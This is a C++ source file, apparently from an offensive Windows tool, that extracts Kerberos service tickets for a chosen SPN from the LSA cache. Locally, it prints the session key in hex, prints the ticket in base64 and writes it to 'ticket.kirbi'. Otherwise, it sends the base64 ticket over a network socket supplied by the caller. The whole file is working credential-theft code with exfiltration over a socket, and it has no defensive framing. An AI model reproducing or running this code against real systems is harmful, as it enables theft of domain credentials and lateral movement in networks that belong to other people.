#include "forger.h"

STRING	kerberosPackageName = { 8, 9, (char*)MICROSOFT_KERBEROS_NAME_A };
DWORD	g_AuthenticationPackageId_Kerberos = 0;
BOOL	g_isAuthPackageKerberos = FALSE;
HANDLE	g_hLSA = NULL;

std::wstring UnicodeStringToWString(const UNICODE_STRING& u) {
    if (!u.Buffer || u.Length == 0) return L"";
    return std::wstring(u.Buffer, u.Length / sizeof(WCHAR));
}

std::wstring KerbExternalNameToWString(PKERB_EXTERNAL_NAME name) {
    if (!name) return L"(null)";
    std::wstring s;
    for (USHORT i = 0; i < name->NameCount; i++) {
        if (i > 0) s += L"/";
        s += UnicodeStringToWString(name->Names[i]);
    }
    return s;
}

std::wstring LargeIntegerTimeToWString(LARGE_INTEGER t) {
    if (t.QuadPart == 0) return L"(null)";
    FILETIME ft;
    ft.dwLowDateTime = (DWORD)(t.QuadPart & 0xFFFFFFFF);
    ft.dwHighDateTime = (DWORD)(t.QuadPart >> 32);

    SYSTEMTIME st;
    if (FileTimeToSystemTime(&ft, &st)) {
        wchar_t buf[128];
        swprintf_s(buf, L"%04d-%02d-%02d %02d:%02d:%02d",
            st.wYear, st.wMonth, st.wDay,
            st.wHour, st.wMinute, st.wSecond);
        return buf;
    }
    return L"(invalid)";
}


NTSTATUS LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLength, PVOID* ProtocolReturnBuffer, PULONG ReturnBufferLength, PNTSTATUS ProtocolStatus)
{
    NTSTATUS status = 0xC0190028; //STATUS_HANDLE_NO_LONGER_VALID;
    if (g_hLSA && g_isAuthPackageKerberos)
        status = LsaCallAuthenticationPackage(g_hLSA, g_AuthenticationPackageId_Kerberos, ProtocolSubmitBuffer, SubmitBufferLength, ProtocolReturnBuffer, ReturnBufferLength, ProtocolStatus);
    return status;
}
void TicketSave(KERB_EXTERNAL_TICKET t) {
    if (t.EncodedTicket && t.EncodedTicketSize > 0) {
        FILE* f = nullptr;
        errno_t err = fopen_s(&f, "ticket.kirbi", "wb"); // binaire
        if (err == 0 && f) {
            size_t written = fwrite(t.EncodedTicket, 1, t.EncodedTicketSize, f);
            fclose(f);
            if (written == t.EncodedTicketSize) {
                std::cout << "Success : Wrote ticket.kirbi (" << written << " bytes)\n";
            }
            else {
                std::cerr << "Partial write: wrote " << written << " of " << t.EncodedTicketSize << " bytes\n";
            }
        }
        else {
            std::cerr << "Failed to open ticket.kirbi for writing (errno=" << err << ")\n";
        }
    }
}

std::string to_base64(const unsigned char* data, size_t len) {
    static const char* b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    out.reserve((len + 2) / 3 * 4);

    for (size_t i = 0; i < len; i += 3) {
        unsigned int v = (data[i] << 16) |
            ((i + 1 < len ? data[i + 1] : 0) << 8) |
            ((i + 2 < len ? data[i + 2] : 0));

        out.push_back(b64[(v >> 18) & 0x3F]);
        out.push_back(b64[(v >> 12) & 0x3F]);
        out.push_back(i + 1 < len ? b64[(v >> 6) & 0x3F] : '=');
        out.push_back(i + 2 < len ? b64[v & 0x3F] : '=');
    }
    return out;
}

void TicketPrinter(KERB_EXTERNAL_TICKET t) {
    std::wcout << L"ServiceName: " << KerbExternalNameToWString(t.ServiceName) << L"\n";
    std::wcout << L"TargetName: " << KerbExternalNameToWString(t.TargetName) << L"\n";
    std::wcout << L"ClientName: " << KerbExternalNameToWString(t.ClientName) << L"\n";

    std::wcout << L"DomainName: " << UnicodeStringToWString(t.DomainName) << L"\n";
    std::wcout << L"TargetDomainName: " << UnicodeStringToWString(t.TargetDomainName) << L"\n";
    std::wcout << L"AltTargetDomainName: " << UnicodeStringToWString(t.AltTargetDomainName) << L"\n";

    std::wcout << L"TicketFlags: 0x" << std::hex << t.TicketFlags << std::dec << L"\n";
    std::wcout << L"Flags: 0x" << std::hex << t.Flags << std::dec << L"\n";

    ULONG skLen = t.SessionKey.Length;
    ULONG skType = t.SessionKey.KeyType;
    PUCHAR skValue = t.SessionKey.Value;

    std::cout << "SessionKey.Length = " << skLen << " bytes\n";
    std::cout << "SessionKey.KeyType = " << skType << "\n";

    if (skValue && skLen > 0) {
        std::cout << "SessionKey (hex): ";
        for (ULONG i = 0; i < skLen; ++i) {
            printf("%02X", skValue[i]);
        }
        std::cout << "\n";
    }
    else {
        std::cout << "SessionKey not present (NULL or length 0)\n";
    }
    std::wcout << L"KeyExpirationTime: " << LargeIntegerTimeToWString(t.KeyExpirationTime) << L"\n";
    std::wcout << L"StartTime: " << LargeIntegerTimeToWString(t.StartTime) << L"\n";
    std::wcout << L"EndTime: " << LargeIntegerTimeToWString(t.EndTime) << L"\n";
    std::wcout << L"RenewUntil: " << LargeIntegerTimeToWString(t.RenewUntil) << L"\n";
    std::wcout << L"TimeSkew: " << LargeIntegerTimeToWString(t.TimeSkew) << L"\n";
    std::wcout << L"EncodedTicketSize: " << t.EncodedTicketSize << L" bytes\n";

    if (t.EncodedTicket && t.EncodedTicketSize > 0) {
        std::string base64 = to_base64(t.EncodedTicket, t.EncodedTicketSize);
        std::wcout << L"EncodedTicket (base64): " << base64.c_str() << L"\n";
    } else {
        std::cerr << "No EncodedTicket or size == 0\n";
    }
}

KERB_EXTERNAL_TICKET retrieveTGS(PCWCH szTargetarg) {
    NTSTATUS status, packageStatus;
    PWCHAR filename = NULL, ticketname = NULL;
    BOOL isNull = FALSE;
    PCWCHAR szTarget = szTargetarg;
    PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
    PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
    DWORD szData;
    USHORT dwTarget;

    dwTarget = (USHORT)((wcslen(szTarget) + 1) * sizeof(wchar_t));

    szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
    if (pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, szData))
    {
        pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
        pKerbRetrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
        pKerbRetrieveRequest->EncryptionType = KERB_ETYPE_NULL;
        pKerbRetrieveRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
        pKerbRetrieveRequest->TargetName.MaximumLength = dwTarget;
        pKerbRetrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
        RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, szTarget, pKerbRetrieveRequest->TargetName.MaximumLength);

        status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData, &packageStatus);
        if (STATUS_SUCCESS == status)
        {
            if (STATUS_SUCCESS == packageStatus)
            {
                KERB_EXTERNAL_TICKET& t = pKerbRetrieveResponse->Ticket;
                return t;
                LsaFreeReturnBuffer(pKerbRetrieveResponse);
            }
            else if (packageStatus == SEC_E_NO_CREDENTIALS)
                std::cout << "no ticket !\n";
            else printf("LsaCallAuthenticationPackage KerbRetrieveTicketMessage / Package : %08x\n", packageStatus);
        }
    }
    return { 0 };
}

int ForgeTicket(PCWCH SPN,BOOL isLocal, SOCKET c) {
    NTSTATUS status = LsaConnectUntrusted(&g_hLSA);

    if (status == STATUS_SUCCESS) {
        status = LsaLookupAuthenticationPackage(g_hLSA, &kerberosPackageName, &g_AuthenticationPackageId_Kerberos);
        g_isAuthPackageKerberos = (status == STATUS_SUCCESS);
        std::wcout << L"SPN: " << SPN << "\n";
        KERB_EXTERNAL_TICKET Ticket = retrieveTGS(SPN);
        if (isLocal) {
            TicketPrinter(Ticket);
            TicketSave(Ticket);
            LsaDeregisterLogonProcess(g_hLSA);
        }
        else {
            std::string TicketB64 = to_base64(Ticket.EncodedTicket, Ticket.EncodedTicketSize);
            int sent = send(c, TicketB64.c_str(), (int)TicketB64.size(), 0);
            if (sent == SOCKET_ERROR) {
                std::cerr << "send failed: " << WSAGetLastError() << "\n";
            }
        }
        
    }
    else {
        std::cout << "Impossible d'ouvrir le handle LSA. NTSTATUS = 0x"
            << std::hex << status << std::dec << "\n";
        ULONG winErr = LsaNtStatusToWinError(status);
        std::cout << "Code d'erreur Win32 correspondant: " << winErr << "\n";
    }
    return 0;
}
